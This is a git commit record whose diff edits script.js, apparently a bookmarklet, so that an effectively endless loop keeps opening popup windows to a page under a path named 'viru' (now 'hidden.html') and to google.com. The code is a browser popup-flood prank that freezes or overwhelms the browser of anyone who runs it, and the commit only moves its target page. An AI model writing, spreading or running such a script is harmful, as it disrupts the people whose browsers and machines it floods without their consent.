15b5cb775bfa3030f257ee2087c6aee610ab8dc0
pa30292 <126904749+pa30292@users.noreply.github.com>
2023-04-21 13:00:13 -0500

    Bookmarklet changes

--- script.js
+++ script.js
@@ -1,7 +1,7 @@
 function myFunction() {
            
             for (var i = 0; i < 40000000000000000000000000000000000000000000000; i++) {
-                 window.open("https://pa30292.github.io/viru/","","height=100,left=0");
+                 window.open("https://pa30292.github.io/viru/hidden.html","","height=100,left=0");
                 open("https://www.google.com/");
                 }
         }
